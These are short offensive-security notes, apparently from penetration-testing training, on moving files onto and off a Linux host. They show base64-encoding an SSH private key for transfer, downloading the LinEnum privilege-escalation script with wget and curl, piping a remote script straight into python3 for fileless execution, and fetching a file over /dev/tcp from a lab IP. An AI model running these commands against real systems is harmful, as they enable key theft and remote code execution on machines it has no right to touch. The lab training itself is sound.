
1. Using base64 encoding and decoding.

```bash

cat id_rsa |base64 -w 0;echo

```

decode the file

```bash

echo -n 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0' | base64 -d > id_rsa

```

2.  using wget and curl

```bash

 wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
 
```


```bash

curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh

```

3. File less download using Wget

```bash

wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```

4. Download with Bash (/dev/tcp)

```bash

exec 3<>/dev/tcp/10.10.10.32/80

echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3

cat <&3

```